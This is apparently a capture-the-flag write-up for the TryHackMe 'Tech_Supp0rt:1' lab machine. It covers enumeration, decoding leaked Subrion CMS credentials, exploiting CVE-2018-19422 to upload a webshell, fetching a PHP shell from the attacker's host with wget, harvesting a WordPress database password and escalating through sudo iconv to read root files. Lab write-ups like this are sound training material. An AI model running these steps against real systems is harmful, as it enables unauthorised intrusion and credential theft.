---
layout: default
title: Tech_Support:1
description: THM - Tech_Supp0rt:1
---

## Enumeration

Fired up nmap and gobuster.

```
Nmap scan report for <IP>
Host is up (0.067s latency).
Not shown: 65531 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: TECHSUPPORT; OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
```
/wordpress       (Status: 301) [Size: 316]
/test            (Status: 301) [Size: 311]
/server-status   (Status: 403) [Size: 277]
```
### SMB Enumeration:
```
 Disk                            Permissions
----                             -----------
print$                            NO ACCESS
websvr                            READ ONLY
IPC$                              NO ACCESS
```
Before checking out the web pages, I'll access the “websvr” share and see if there's anything juicy inside.

```
smbclient -N //<IP>/websvr

smb: \> ls
  .                                   D        0  Sat May 29 10:17:38 2021
  ..                                  D        0  Sat May 29 10:03:47 2021
  enter.txt                           N      273  Sat May 29 10:17:38 2021

                8460484 blocks of size 1024. 5693200 blocks available
smb: \> get enter.txt
getting file \enter.txt of size 273 as enter.txt (1.0 KiloBytes/sec) (average 1.0 KiloBytes/sec)
smb: \> exit

cat enter.txt
GOALS
=====
1)Make fake popup and host it online on Digital Ocean server
2)Fix subrion site, /subrion doesn't work, edit from panel
3)Edit wordpress website

IMP
===
Subrion creds
|->admin:[REDACTED] [cooked with magical formula]
Wordpress creds
|->
```

Now this is interesting. We found Subrion credentials. I'll throw them into Cyberchef and see what pops up.

![CyberChef](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/1.png)

We now have the Subrion CMS admin credentials. Let's look around on the website.

first I tried accessing “/subrion”, but then, when it wasn't working, I went backwards, and noticed the entry in “enter.txt”, which states that “/subrion”
doesn't work, and to use the panel. So i tried the next best thing. “/subrion/panel”.
And what do you know! It worked!

![Subrion Panel](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/2.png)

Now, this CMS gracefully provided us with the version, so it won't hurt looking for a CVE, right ?
Bingo!
CVE-2018-19422-SubrionCMS-RCE

Let's try logging in with the credentials we gathered, because the exploit requires authentication.

(Meanwhile I also enumerated the wordpress site and found the user “support”. I'll save it, maybe it'll come in handy)

Aaaand we logged in:
![Subrion Dash](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/3.png)

## Exploitation

Let's try the RCE.

```
python3 SubrionRCE.py -u http://<IP>/subrion/panel/ -l admin -p [REDACTED]
[+] Trying to connect to: http://<IP>/subrion/panel/
[+] Success!
[+] Got CSRF token: [REDACTED]
[+] Trying to log in...
[+] Login Successful!

[+] Generating random name for Webshell...
[+] Generated webshell name: mwfyhhiowaujnqk

[+] Trying to Upload Webshell..
[+] Upload Success... Webshell path: http://<IP>/subrion/panel/uploads/mwfyhhiowaujnqk.phar

$ whoami
www-data
```
I then uploaded another shell, because this one is a bit fucky, and upgraded using a python TTY
```
$ wget http://10.18.116.220:8000/shell.php

$ ls
mwfyhhiowaujnqk.phar
shell.php
zrqcdnixvfcwxop.phar

$ php shell.php

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@TechSupport:/$
```
We cd into the /opt directory, empty.
Cd into the /home directory, there's the scamsite directory with the “enter.txt” file we found earlier.

So i'll start looking for SUID binaries, since we don't have sudo permissions.
```
find / -perm -u=s -type f 2>/dev/null
```
No luck there, so we start snooping around. You can check default locations, or you can use linpeas.
I opted for linpeas.
```
/var/www/html/wordpress/wp-config.php
define( 'DB_NAME', 'wpdb' );
define( 'DB_USER', 'support' );
define( 'DB_PASSWORD', '[REDACTED]' );
define( 'DB_HOST', 'localhost' );
```
And what do you know, it found a pasword for the user “support”. I'll try to ssh into the machine using the “scamsite” user that we found, and this password.
Aaand it worked.

Let's see what we can do from this user. First of all, I'm gonna ssh into the machine for a more stable shell.

## Privilege Escalation:
```
scamsite@TechSupport:~$ sudo -l
Matching Defaults entries for scamsite on TechSupport:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User scamsite may run the following commands on TechSupport:
    (ALL) NOPASSWD: /usr/bin/iconv
```
scamsite may use iconv to read files. We could use it to read and crack the /etc/shadow file, or the id_rsa from the root folder. But that's not necessary for proof of completion, so we'll just read "/root/root.txt"
```
LFILE=/root/root.txt
sudo iconv -f 8859_1 -t 8859_1 "$LFILE"
```
And we got the flag!
![Flag](https://raw.githubusercontent.com/TudM99/tudm99.github.io/main/images/4.png)


[back](./)
